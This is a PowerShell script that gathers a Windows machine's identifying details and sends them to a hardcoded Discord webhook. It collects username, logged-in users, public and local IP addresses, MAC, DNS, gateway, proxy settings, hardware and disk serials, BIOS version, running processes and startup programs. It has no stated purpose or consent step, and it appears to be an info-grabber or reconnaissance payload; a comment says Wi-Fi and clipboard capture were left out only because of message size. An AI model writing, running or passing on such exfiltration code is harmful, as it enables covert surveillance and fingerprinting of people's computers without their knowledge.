# ====== CONFIG ======
$webhook = "https://discord.com/api/webhooks/1395999594873360496/gB_Cb_ne-7St_36jupLAaCsRo-KzsEqNxRooJZdzGOVVvWA2WgxXWvlzmizf1FoviCvg"

# ====== BASIC INFO ======
$pc_user = $env:USERNAME
$loggedInUsers = (quser 2>&1) -join "`n"
$pc_name = $env:COMPUTERNAME
$run_time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
$boot = (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
$uptime = (New-TimeSpan -Start $boot -End (Get-Date)).ToString("hh\:mm\:ss")
$public_ip = Invoke-RestMethod -Uri "https://api.ipify.org"
$local_ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -notlike "169.*"} | Select-Object -First 1).IPAddress
$hwid = (Get-WmiObject Win32_BaseBoard).SerialNumber
$cpu_name = (Get-WmiObject Win32_Processor).Name
$cpu_id = (Get-WmiObject Win32_Processor).ProcessorId
$gpu_name = (Get-WmiObject Win32_VideoController).Name
$ram = [math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1MB)
$os_name = (Get-WmiObject Win32_OperatingSystem).Caption
$mac = (Get-NetAdapter | Where-Object {$_.Status -eq "Up"} | Select-Object -First 1).MacAddress
$dns = (Get-DnsClientServerAddress | Where-Object {$_.ServerAddresses} | Select-Object -ExpandProperty ServerAddresses) -join ", "
$gateway = (Get-NetRoute -DestinationPrefix "0.0.0.0/0" | Select-Object -First 1).NextHop
$proxy = (netsh winhttp show proxy | Out-String).Trim()
$disk_serial = (Get-WmiObject Win32_DiskDrive | Select-Object -First 1).SerialNumber
$bios = (Get-WmiObject Win32_BIOS).SMBIOSBIOSVersion

# ====== RUNNING PROCESSES ======
$processList = Get-Process | Sort-Object ProcessName | Select-Object -ExpandProperty ProcessName
$processString = $processList -join ", "
$shortProcesses = ($processList | Select-Object -First 50) -join ", "
if ($processList.Count -gt 50) {
    $shortProcesses += "`n...and $($processList.Count - 50) more"
}

$startupApps = (Get-CimInstance Win32_StartupCommand | Select-Object Name, Command) | ForEach-Object { "$($_.Name): $($_.Command)" }
$startupApps = $startupApps -join "`n"

# ====== CREATE MESSAGE ======
$body = @{
    content = @"
# System Info Report

## Instance Info
**User**: $pc_user
**Logged in Users**: $loggedInUsers
**PC Name**: $pc_name
**Run Time**: $run_time
**Last Boot-UP**: $boot
**Up time**: $uptime
**BIOS**: $bios
**OS**: $os_name

## Network Info
**Public IP**: $public_ip
**Local IP**: $local_ip
**MAC**: $mac
**DNS**: $dns
**Gateway**: $gateway
**Proxy**: $proxy

## Wifi Info & Clipboard
- Disabled due to discord text ammount limitations.

## Hardware Info
**HWID**: $hwid
**CPU**: $cpu_name (ID: $cpu_id)
**GPU**: $gpu_name
**RAM**: $ram MB
**Disk Serial**: $disk_serial

## Processes in Instance
**Startup Processes**:
**Running Processes (First 50)**:
$shortProcesses
"@
} | ConvertTo-Json

# ====== SEND TO DISCORD ======
Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType "application/json"
